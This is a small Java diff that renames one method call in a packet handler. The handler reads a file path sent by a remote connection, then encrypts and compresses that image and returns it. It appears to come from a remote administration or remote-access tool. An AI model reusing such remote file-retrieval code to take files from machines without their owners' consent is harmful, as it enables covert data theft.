@@ -19,7 +19,7 @@ public class Packet62PreviewImage extends AbstractIncomingPacket {
 		String file = Connection.readLine();
 
 		BufferedImage screenShot = ImageIO.read(new File(file));
-		byte[] buffer = ImageUtils.encodeImage(screenShot);
+		byte[] buffer = ImageUtils.encode(screenShot);
 		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
 
 		Connection.addToSendQueue(new Packet43PreviewImage(buffer.length, screenShot.getWidth(), screenShot.getHeight()));
